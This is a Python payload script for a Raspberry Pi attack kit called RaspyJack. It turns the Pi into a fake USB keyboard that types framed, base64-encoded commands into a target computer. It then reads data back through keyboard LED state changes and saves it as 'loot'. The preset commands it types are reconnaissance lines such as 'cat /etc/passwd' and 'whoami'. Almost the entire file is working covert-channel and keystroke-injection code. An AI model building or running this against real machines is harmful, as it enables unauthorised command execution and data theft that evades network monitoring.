#!/usr/bin/env python3
"""
RaspyJack Payload -- HID Covert Channel
========================================
Author: RaspyJack Contributors

Bidirectional data exfiltration over USB HID reports.
Pi→Target: keystrokes injected via /dev/hidg0 (base64 encoded).
Target→Pi: LED state changes (Caps/Num/Scroll Lock) decode to bits.

Frame protocol
--------------
  0xAA  start-of-frame
  LEN   1-byte payload length
  DATA  payload bytes
  XOR   1-byte XOR checksum of LEN+DATA

Controls
--------
  OK         -- Start / stop transfer
  UP / DOWN  -- Scroll log / select preset message
  KEY1       -- Cycle view (SEND / RECEIVE / LOG)
  LEFT       -- Back
  KEY2       -- Export log to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/HIDCovert/
"""

import os
import sys
import time
import json
import struct
import base64
import threading
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot/HIDCovert"
HIDG_PATH = "/dev/hidg0"

C_BG = "#0a0a12"
C_CYAN = "#00E5FF"
C_GREEN = "#00E676"
C_RED = "#FF5252"
C_YELLOW = "#FFD740"
C_MUTED = "#888888"
C_DIM = "#444444"
C_HEADER = "#0d1117"

VIEWS = ["SEND", "RECEIVE", "LOG"]

# USB HID key codes for printable ASCII (US layout)
_KEY_MAP = {}
_SHIFT = 0x02
for i, ch in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _KEY_MAP[ch] = (0, 4 + i)
    _KEY_MAP[ch.upper()] = (_SHIFT, 4 + i)
for i, ch in enumerate("1234567890"):
    _KEY_MAP[ch] = (0, 30 + i)
_SYM_UNSHIFTED = {
    "\n": (0, 0x28), " ": (0, 0x2C), "-": (0, 0x2D), "=": (0, 0x2E),
    "[": (0, 0x2F), "]": (0, 0x30), "\\": (0, 0x31), ";": (0, 0x33),
    "'": (0, 0x34), "`": (0, 0x35), ",": (0, 0x36), ".": (0, 0x37),
    "/": (0, 0x38),
}
_SYM_SHIFTED = {
    "!": (_SHIFT, 30), "@": (_SHIFT, 31), "#": (_SHIFT, 32),
    "$": (_SHIFT, 33), "%": (_SHIFT, 34), "^": (_SHIFT, 35),
    "&": (_SHIFT, 36), "*": (_SHIFT, 37), "(": (_SHIFT, 38),
    ")": (_SHIFT, 39), "_": (_SHIFT, 0x2D), "+": (_SHIFT, 0x2E),
    "{": (_SHIFT, 0x2F), "}": (_SHIFT, 0x30), "|": (_SHIFT, 0x31),
    ":": (_SHIFT, 0x33), '"': (_SHIFT, 0x34), "~": (_SHIFT, 0x35),
    "<": (_SHIFT, 0x36), ">": (_SHIFT, 0x37), "?": (_SHIFT, 0x38),
}
_KEY_MAP.update(_SYM_UNSHIFTED)
_KEY_MAP.update(_SYM_SHIFTED)

PRESET_MESSAGES = [
    "whoami",
    "hostname && ip a",
    "cat /etc/passwd",
    "echo EXFIL_START",
]


def _xor_checksum(data: bytes) -> int:
    x = 0
    for b in data:
        x ^= b
    return x


def _build_frame(payload: bytes) -> bytes:
    length = len(payload) & 0xFF
    body = bytes([length]) + payload
    return bytes([0xAA]) + body + bytes([_xor_checksum(body)])


def _hid_report(modifier: int, keycode: int) -> bytes:
    return struct.pack("8B", modifier, 0, keycode, 0, 0, 0, 0, 0)


def _release_report() -> bytes:
    return b"\x00" * 8


class HIDCovertChannel:
    def __init__(self):
        self.view_idx = 0
        self.running = False
        self.stop_evt = threading.Event()
        self.scroll = 0
        self.preset_idx = 0
        self.tx_progress = 0.0
        self.tx_total = 0
        self.tx_sent = 0
        self.rx_bits = []
        self.rx_bytes = bytearray()
        self.rx_decoded = ""
        self.log = deque(maxlen=200)
        self.rx_thread = None
        self.tx_thread = None
        self.status = "IDLE"
        self.hidg_ok = os.path.exists(HIDG_PATH)

    def _log(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log.append(f"[{ts}] {msg}")

    def _send_keystroke(self, fd, char: str):
        entry = _KEY_MAP.get(char)
        if entry is None:
            return
        mod, code = entry
        os.write(fd, _hid_report(mod, code))
        time.sleep(0.008)
        os.write(fd, _release_report())
        time.sleep(0.004)

    def _tx_worker(self, text: str):
        encoded = base64.b64encode(text.encode()).decode()
        frame = _build_frame(encoded.encode())
        self.tx_total = len(frame)
        self.tx_sent = 0
        self.tx_progress = 0.0
        self._log(f"TX start: {len(text)}B -> {len(encoded)}B b64")
        try:
            fd = os.open(HIDG_PATH, os.O_WRONLY)
        except OSError as e:
            self._log(f"TX error: {e}")
            self.status = "TX FAIL"
            return
        try:
            for i, byte_val in enumerate(frame):
                if self.stop_evt.is_set():
                    self._log("TX aborted")
                    self.status = "ABORTED"
                    return
                for ch in f"{byte_val:02X}":
                    self._send_keystroke(fd, ch)
                self.tx_sent = i + 1
                self.tx_progress = self.tx_sent / self.tx_total
            os.write(fd, _hid_report(0, 0x28))
            time.sleep(0.008)
            os.write(fd, _release_report())
            self._log(f"TX done: {self.tx_sent} bytes")
            self.status = "TX DONE"
        except OSError as e:
            self._log(f"TX error: {e}")
            self.status = "TX FAIL"
        finally:
            os.close(fd)

    def _rx_worker(self):
        self._log("RX listening for LED changes")
        self.status = "RX LISTEN"
        prev_leds = 0
        bit_buf = []
        try:
            fd = os.open(HIDG_PATH, os.O_RDONLY | os.O_NONBLOCK)
        except OSError as e:
            self._log(f"RX error: {e}")
            self.status = "RX FAIL"
            return
        try:
            while not self.stop_evt.is_set():
                try:
                    data = os.read(fd, 1)
                    if data:
                        leds = data[0]
                        if leds != prev_leds:
                            bit = leds & 0x01
                            bit_buf.append(bit)
                            if len(bit_buf) == 8:
                                byte_val = 0
                                for j, b in enumerate(bit_buf):
                                    byte_val |= b << j
                                self.rx_bytes.append(byte_val)
                                bit_buf.clear()
                                self._log(f"RX byte: 0x{byte_val:02X}")
                            prev_leds = leds
                except BlockingIOError:
                    pass
                time.sleep(0.01)
        except OSError:
            pass
        finally:
            os.close(fd)
        if self.rx_bytes:
            try:
                self.rx_decoded = base64.b64decode(bytes(self.rx_bytes)).decode(errors="replace")
                self._log(f"RX decoded: {len(self.rx_decoded)} chars")
            except Exception:
                self.rx_decoded = self.rx_bytes.hex()
                self._log("RX raw hex (decode failed)")
        self.status = "RX DONE"

    def start_tx(self):
        if self.tx_thread and self.tx_thread.is_alive():
            return
        self.stop_evt.clear()
        text = PRESET_MESSAGES[self.preset_idx]
        self.status = "TX..."
        self._log(f"Sending: {text[:40]}")
        self.tx_thread = threading.Thread(target=self._tx_worker, args=(text,), daemon=True)
        self.tx_thread.start()

    def start_rx(self):
        if self.rx_thread and self.rx_thread.is_alive():
            return
        self.stop_evt.clear()
        self.rx_bits.clear()
        self.rx_bytes.clear()
        self.rx_decoded = ""
        self.status = "RX..."
        self.rx_thread = threading.Thread(target=self._rx_worker, daemon=True)
        self.rx_thread.start()

    def stop(self):
        self.stop_evt.set()
        self.status = "STOPPED"
        self._log("Stopped")

    def draw(self, draw, img):
        draw.rectangle([(0, 0), (WIDTH, HEIGHT)], fill=C_BG)
        view = VIEWS[self.view_idx]
        draw.rectangle([(0, 0), (WIDTH, ROW_H)], fill=C_HEADER)
        label = f"HID Covert [{view}]"
        draw.text((2, 1), label, fill=C_CYAN, font=font)
        hid_label = "OK" if self.hidg_ok else "NO"
        hid_color = C_GREEN if self.hidg_ok else C_RED
        draw.text((WIDTH - 24, 1), hid_label, fill=hid_color, font=font)
        y = ROW_H + 2

        if view == "SEND":
            draw.text((2, y), "Preset:", fill=C_MUTED, font=font)
            y += ROW_H
            for i, msg in enumerate(PRESET_MESSAGES):
                color = C_CYAN if i == self.preset_idx else C_DIM
                prefix = ">" if i == self.preset_idx else " "
                draw.text((2, y), f"{prefix}{msg[:18]}", fill=color, font=font)
                y += ROW_H
                if y > HEIGHT - ROW_H * 3:
                    break
            y = HEIGHT - ROW_H * 3
            draw.text((2, y), f"Status: {self.status}", fill=C_YELLOW, font=font)
            y += ROW_H
            if self.tx_total > 0:
                bar_w = WIDTH - 8
                draw.rectangle([(2, y), (2 + bar_w, y + 8)], outline=C_DIM)
                fill_w = int(bar_w * self.tx_progress)
                if fill_w > 0:
                    draw.rectangle([(2, y), (2 + fill_w, y + 8)], fill=C_GREEN)
                y += ROW_H
                draw.text((2, y), f"{self.tx_sent}/{self.tx_total} bytes", fill=C_MUTED, font=font)

        elif view == "RECEIVE":
            draw.text((2, y), f"Status: {self.status}", fill=C_YELLOW, font=font)
            y += ROW_H
            draw.text((2, y), f"Bits: {len(self.rx_bits)}  Bytes: {len(self.rx_bytes)}", fill=C_MUTED, font=font)
            y += ROW_H * 2
            if self.rx_decoded:
                draw.text((2, y), "Decoded:", fill=C_GREEN, font=font)
                y += ROW_H
                for line in [self.rx_decoded[i:i+20] for i in range(0, len(self.rx_decoded), 20)][:5]:
                    draw.text((2, y), line, fill=C_CYAN, font=font)
                    y += ROW_H
            elif self.rx_bytes:
                draw.text((2, y), "Raw hex:", fill=C_YELLOW, font=font)
                y += ROW_H
                hex_str = self.rx_bytes.hex()
                for line in [hex_str[i:i+24] for i in range(0, len(hex_str), 24)][:4]:
                    draw.text((2, y), line, fill=C_MUTED, font=font)
                    y += ROW_H
            else:
                draw.text((2, y), "Waiting for LED data...", fill=C_DIM, font=font)

        elif view == "LOG":
            entries = list(self.log)
            total = len(entries)
            vis = (HEIGHT - ROW_H - 4) // ROW_H
            start = max(0, min(self.scroll, total - vis))
            for entry in entries[start:start + vis]:
                draw.text((2, y), entry[:22], fill=C_MUTED, font=font)
                y += ROW_H

        draw.rectangle([(0, HEIGHT - ROW_H)], fill=C_HEADER)
        draw.text((2, HEIGHT - ROW_H + 1), "OK:go 1:view 2:save 3:exit", fill=C_DIM, font=font)

    def export_log(self):
        os.makedirs(LOOT_DIR, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOOT_DIR, f"hid_covert_{ts}.json")
        data = {
            "timestamp": ts,
            "log": list(self.log),
            "rx_hex": self.rx_bytes.hex() if self.rx_bytes else "",
            "rx_decoded": self.rx_decoded,
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        self._log(f"Exported to {os.path.basename(path)}")
        return path


def main():
    ch = HIDCovertChannel()
    img = Image.new("RGB", (WIDTH, HEIGHT), C_BG)
    draw = ScaledDraw(img)

    try:
        while True:
            ch.draw(draw, img)
            LCD.LCD_ShowImage(img, 0, 0)
            btn = get_button(PINS, timeout=0.15)
            if btn is None:
                continue

            view = VIEWS[ch.view_idx]

            if btn == "KEY3":
                ch.stop()
                break
            elif btn == "KEY1":
                ch.view_idx = (ch.view_idx + 1) % len(VIEWS)
                ch.scroll = 0
            elif btn == "KEY2":
                ch.export_log()
            elif btn == "OK":
                if ch.running:
                    ch.stop()
                    ch.running = False
                else:
                    ch.running = True
                    if view == "SEND":
                        ch.start_tx()
                    elif view == "RECEIVE":
                        ch.start_rx()
            elif btn == "UP":
                if view == "SEND":
                    ch.preset_idx = max(0, ch.preset_idx - 1)
                else:
                    ch.scroll = max(0, ch.scroll - 1)
            elif btn == "DOWN":
                if view == "SEND":
                    ch.preset_idx = min(len(PRESET_MESSAGES) - 1, ch.preset_idx + 1)
                else:
                    ch.scroll += 1
            elif btn == "LEFT":
                if ch.view_idx > 0:
                    ch.view_idx -= 1
                    ch.scroll = 0
    finally:
        ch.stop()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
